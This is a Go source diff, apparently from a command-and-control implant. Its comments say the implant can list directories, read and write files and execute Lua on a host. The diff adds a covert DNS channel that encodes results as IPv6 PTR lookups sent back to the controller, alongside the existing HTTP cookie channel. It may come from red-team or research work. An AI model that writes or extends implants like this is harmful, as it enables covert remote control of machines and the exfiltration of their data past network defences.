@@ -8,7 +8,12 @@ import (
 	"io"
 	"log"
 	"net/http"
+	"strconv"
 )
+
+// dnsConf helps determine if DNS comms are enabled
+var dnsConfStr string
+var dnsConf, _ = strconv.ParseBool(dnsConfStr)
 
 // ResponseData Struct to hold the response format from the server
 // The key is the HMAC used to verify the data retrieved using a shared secret
@@ -55,6 +60,7 @@ func main() {
 		// if false, the params are instead appended to the request uncompressed
 		compedData, boolRes := shared.DoComp(hardVals)
 		if boolRes {
+			fmt.Println("Compressing data")
 			encodedData := base64.StdEncoding.EncodeToString(compedData.Bytes())
 			tokenCookie := &http.Cookie{Name: "da", Value: encodedData}
 			// makeGetRequest 3 times with a 10 second delay between each attempt
@@ -113,17 +119,28 @@ func main() {
 				// A switch statement to run through possible command options, including using the lua engine
 				// List arbitrary dir, read file, write file, execute Lua
 				// Returns the result of execution (stdout or bool) or returns an error
-				request, err := shared.SendDataRequest(postUrl, "test success")
-				if err != nil {
-					return
+				if dnsConf == true {
+					encRes := []string{shared.Ipv6ToPTR("test success")}
+					err := shared.SendPTRRequest(CompUUID, encRes)
+					if err != true {
+						return
+					}
+					fmt.Println("Success")
+					break
+				} else {
+					request, err := shared.SendDataRequest(postUrl, "test success")
+					if err != nil {
+						return
+					}
+					fmt.Println(request)
+					break
 				}
-				fmt.Println(request)
-				break
 			} else {
 				fmt.Println("HMAC is invalid or message was tampered with.")
 				break
 			}
 		} else {
+			fmt.Println("Not compressing data")
 			tokenCookie := &http.Cookie{Name: "token", Value: token}
 			timestampCookie := &http.Cookie{Name: "timestamp", Value: timestamp}
 			//reqURL.RawQuery = params.Encode()
@@ -185,12 +202,22 @@ func main() {
 				// A switch statement to run through possible command options, including using the lua engine
 				// List arbitrary dir, read file, write file, execute Lua
 				// Returns the result of execution (stdout or bool) or returns an error
-				request, err := shared.SendDataRequest(postUrl, "test success")
-				if err != nil {
-					return
+				if dnsConf == true {
+					encRes := []string{shared.Ipv6ToPTR("test success")}
+					err := shared.SendPTRRequest(CompUUID, encRes)
+					if err != true {
+						return
+					}
+					fmt.Println("Success")
+					break
+				} else {
+					request, err := shared.SendDataRequest(postUrl, "test success")
+					if err != nil {
+						return
+					}
+					fmt.Println(request)
+					break
 				}
-				fmt.Println(request)
-				break
 			} else {
 				fmt.Println("HMAC is invalid or message was tampered with.")
 				break
